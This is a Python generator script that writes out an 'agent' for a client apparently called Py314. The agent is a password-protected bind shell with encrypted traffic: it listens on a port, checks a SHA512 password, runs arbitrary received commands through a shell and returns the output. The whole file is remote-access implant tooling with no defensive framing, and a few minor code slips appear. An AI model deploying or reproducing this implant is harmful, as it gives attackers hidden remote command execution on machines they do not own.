
import sys
import logging


def writeAgent(output, rhost, rport, password):

    agent  = '''

import os
import sys
import socket
import base64
import hashlib
import logging
import threading
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password):
    """Generate fernet key from password"""

    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(password.encode())
    key = base64.urlsafe_b64encode(digest.finalize())

    logging.debug(f"Password for key generation : {{password}}")
    logging.debug(f"Generated key : {{key}}")

    return key

def encrypt_file(password, infile, outfile):
    """Encrypt file"""

    try:

        fernet = Fernet(generate_key(password))

        with open(infile, 'rb') as fileStream:
            plainData = fileStream.read()

        with open(outfile, 'wb') as fileStream:

            encrypted = fernet.encrypt(plainData)
            fileStream.write(encrypted)
            
    except Exception as error:
        logging.warning(error)



def encrypt_message(password, message):
    """Encrypt a message with str type and return message as str encrypted"""
    
    fernet = Fernet(generate_key(password))

    message = message.encode()
    encrypted = fernet.encrypt(message)

    logging.debug(f"Message before encryption : {{message}}")
    logging.debug(f"Message after encryption : {{encrypted.decode()}}")

    return encrypted.decode()
    
def decrypt_file(password, infile, outfile):
    """Encrypt file"""

    try:

        fernet = Fernet(generate_key(password))

        with open(infile, 'rb') as fileStream:
            cipherData = fileStream.read()

        with open(outfile, 'wb') as fileStream:

            decrypted = fernet.decrypt(cipherData)
            fileStream.write(decrypted)
            
    except Exception as error:
        logging.warning(error)


def decrypt_message(password, message):
    """Decrypt a message with str type and return message as str decrypted"""

    fernet = Fernet(generate_key(password))

    message = message.encode()
    decrypted = fernet.decrypt(message)

    logging.debug(f"Message before decryption : {{message}}")
    logging.debug(f"Message after decryption : {{decrypted.decode()}}")

    return decrypted.decode()





def passwordChallenge(channel, passwd):

    bufferSize = BUFFER_SIZE

    ciperPassword = hashlib.sha512(passwd.encode()).hexdigest()
    while True:
        rawHashPassword = channel.recv(bufferSize)
        if len(rawHashPassword) < bufferSize:
            break

    # Decode bytes to str
    hashPassword = rawHashPassword.decode()

    logging.debug(f"Password used for password channel : {{password}}")
    logging.debug(f"Generated SHA512 : {{ciperPassword}}")
    logging.debug(f"Received SHA512 : {{hashPassword}}")
    
    if hashPassword == ciperPassword:
        logging.debug('Successfull password challenge')
        response = hashlib.sha512(ciperPassword.encode()).hexdigest()
        channel.sendall(response.encode())
        challenge = True
    
    elif hashPassword != ciperPassword:
        logging.debug('Password challenge failed')
        response = b' '
        channel.sendall(response)
        channel.close()
        challenge = False

    return challenge, hashPassword


def receiveFile(channel, password, request):
    
    src = request.split(' ')[1]
    srcBasename = os.path.basename(src)
    dst = request.split(' ')[2]

    logging.debug(f"Channel : {{channel}}")
    logging.debug(f"Password : {{password}}")
    logging.debug(f"Request : {{request.split(' ')[0]}}")
    logging.debug(f"Wanted filename : {{srcBasename}}")
    logging.debug(f"Destination folder : {{dst}}")

    if not os.path.isdir(dst):
        answer = '!'
    elif os.path.isdir(dst):
        answer = 'ready'

    encryptedAnswer = encrypt_message(password, answer)
    channel.sendall(encryptedAnswer.encode())




def serverHandler(channel, password):

    #crypto = Crypto(password)


    # Loop on socket.recv
    while True:
    
        try:
            # Define buffer size, can be increased
            bufferSize = BUFFER_SIZE
            rawRequest, tempBuffer = b'', b''
            
            # While loop to complete socket buffer in recv 
            while True:
                tempBuffer = channel.recv(bufferSize)
                rawRequest += tempBuffer
                if len(tempBuffer) < bufferSize:
                    break
            # Decode bytes to str
            clientRequestEncrypted = rawRequest.decode()
            clientRequest = decrypt_message(password, clientRequestEncrypted)
    
# ------------------------------- Py314 REQUEST PARSING -------------------------------

            # If 'cd' command send
            if clientRequest.split(' ')[0] == 'cd':
                workingDir = clientRequest.split(' ')[1]
                logging.debug('Cd command send by Py314')
                logging.debug(f'Want to move to {{workingDir}}')
                if os.path.isdir(workingDir):
                    os.chdir(workingDir)
                    # Return empty output, to not block the remote shell
                    output = ' '
                else:
                    output = f"{{workingDir}} doesn'nt exist"

                encryptedOutput = encrypt_message(password, output)
                channel.sendall(encryptedOutput.encode())

            # If check alive
            elif clientRequest == 'alive ?':
                logging.debug('Alive checking from Py314')
                output  = "alive !"
                logging.debug('Sending alive')

                encryptedOutput = encrypt_message(password, output)
                channel.sendall(encryptedOutput.encode())

            # Elif client want to send a file
            elif clientRequest.split(' ')[0] == 'send':
                receiveFile(channel, password, clientRequest)
            
            # Else execute shell command
            else:
                workingDir = os.getcwd()
                output = shellCommand(clientRequest, workingDir)

                encryptedOutput = encrypt_message(password, output)
                channel.sendall(encryptedOutput.encode())


        except KeyboardInterrupt:
            channel.close()
            exit()

        except Exception as error:
            logging.warning(f"{{error}}")
            exit()

    




def shellCommand(command, cwd):

    # Easy command, with no output handler
    #output = subprocess.check_output(command, shell=True, stderr=STDOUT)

    # Complete shell command, with pipe to get STDOUT, STDERR
    shellCommand = subprocess.Popen(

        str(command),
        cwd=cwd,
        shell=True, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        stdin=subprocess.PIPE
    )
    
    # Get exit code
    exitCode = shellCommand.returncode
    # Parse STDOUT and STDERR
    STDOUT, STDERR = shellCommand.communicate()

    # If not STDOUT and STDERR, return STDERR in remote shell
    if not STDOUT and STDERR:
        shellOutput = STDERR
    # If STDOUT and not STDERR, return STDOUT in remote shell
    elif not STDERR and STDOUT:
        shellOutput = STDOUT
    # Else, return an empty str (in case of system command touch/rm/cat...)
    else:
        shellOutput = b' '

    return shellOutput.decode()

# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------

BUFFER_SIZE = 4096

if len(sys.argv) > 1:
    verbose = sys.argv[1]
    if verbose == '-v':
        level = logging.INFO
        logFormat = '[%(asctime)s]-[%(levelname)s] : %(message)s'
    elif verbose == '-vv':
        level = logging.DEBUG
        logFormat = '[%(asctime)s]-[%(levelname)s] (from %(funcName)s in %(module)s) : %(message)s'

    logging.basicConfig(level=level, format=logFormat, datefmt='%H:%M:%S')


bindPort = {}
bindAddress = '{}'
password = '{}'
ciperPassword = hashlib.sha512(password.encode()).hexdigest()

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

serverSocket.bind((bindAddress, bindPort))
serverSocket.listen(5)

logging.info(f"Listening on {{bindAddress}}:{{bindPort}}")
#print(f"[?] Listening on {{bindAddress}}:{{bindPort}}")

while True:

    try:

        channel, cliAddress = serverSocket.accept()
        logging.info(f"Received Connection from {{cliAddress[0]}}")
        challenge, receivedHash = passwordChallenge(channel, password)
        if challenge is True:
            serverHandler(channel, password)
        elif challenge is False:
            logging.debug(f"Closing channel {{channel}}")
            channel.close()


    except KeyboardInterrupt:
        serverSocket.close()
        exit()
        
        
    except Exception as error:
        logging.warning(f"{{error}}")
        serverSocket.close()
        exit()

 

    '''.format(
        rport,
        rhost,
        password
    )

    try:

        with open(output, 'w') as fileStream:
            fileStream.write(agent)

        logger.info(f"Agent successfully write to {output}")

    except Exception as error:
        logger.warning(f"An error occured when trying to write agent : ")
        print(error)

# --------------------------------------------------------------------
# --------------------------- Main -----------------------------------
# --------------------------------------------------------------------


logger = logging.getLogger('main')